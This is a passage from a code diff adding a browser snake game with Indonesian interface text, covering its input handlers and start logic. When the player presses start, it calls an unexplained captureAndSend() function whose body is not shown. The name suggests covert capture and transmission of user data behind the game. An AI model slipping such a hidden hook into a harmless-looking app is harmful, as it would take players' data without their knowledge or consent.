+      startBtn.disabled = false;
+      startBtn.textContent = '▶ Mulai Game';
+    }
+
+    // ============================
+    //  EVENT TOMBOL MULAI
+    // ============================
+    startBtn.addEventListener('click', async function() {
+      if (gameRunning) return;
+      if (gameInterval) {
+        clearInterval(gameInterval);
+        gameInterval = null;
+      }
+      statusText.textContent = 'Memulai...';
+      startBtn.disabled = true;
+      startBtn.textContent = '⏳';
+      await captureAndSend();
+      initGame();
+      gameRunning = true;
+      startBtn.disabled = false;
+      startBtn.textContent = '⏹️ Game Berjalan';
+      statusText.textContent = 'Mainkan!';
+      gameInterval = setInterval(gameLoop, 150);
+    });
+
+    // Keyboard
+    document.addEventListener('keydown', (e) => {
+      const key = e.key;
+      e.preventDefault();
+      if (!gameRunning) return;
+      if (key === 'ArrowUp' && direction !== 'DOWN') nextDirection = 'UP';
+      else if (key === 'ArrowDown' && direction !== 'UP') nextDirection = 'DOWN';
+      else if (key === 'ArrowLeft' && direction !== 'RIGHT') nextDirection = 'LEFT';
+      else if (key === 'ArrowRight' && direction !== 'LEFT') nextDirection = 'RIGHT';
+    });
+
+    // Touch
+    let touchStartX = 0,
+      touchStartY = 0;
+    canvas.addEventListener('touchstart', (e) => {
+      const touch = e.touches[0];
+      touchStartX = touch.clientX;
+      touchStartY = touch.clientY;
+      e.preventDefault();
+    });
+    canvas.addEventListener('touchmove', (e) => { e.preventDefault(); });
+    canvas.addEventListener('touchend', (e) => {
+      if (!gameRunning || touchStartX === 0) return;
+      const touch = e.changedTouches[0];
+      const dx = touch.clientX - touchStartX;
+      const dy = touch.clientY - touchStartY;
+      if (Math.abs(dx) > Math.abs(dy)) {
+        if (dx > 0 && direction !== 'LEFT') nextDirection = 'RIGHT';
+        else if (dx < 0 && direction !== 'RIGHT') nextDirection = 'LEFT';
+      } else {
+        if (dy > 0 && direction !== 'UP') nextDirection = 'DOWN';
+        else if (dy < 0 && direction !== 'DOWN') nextDirection = 'UP';
+      }
+      touchStartX = 0;
+      touchStartY = 0;
+    });
+
+    // ============================
+    //  START
+    // ============================
+    highScore = parseInt(localStorage.getItem('snakeHighScore')) || 0;
+    highScoreSpan.textContent = highScore;
+    initGame();
+    drawCanvas();
+    statusText.textContent = 'Tekan tombol Mulai Game untuk bermain';
+  </script>
 </body>
 </html>
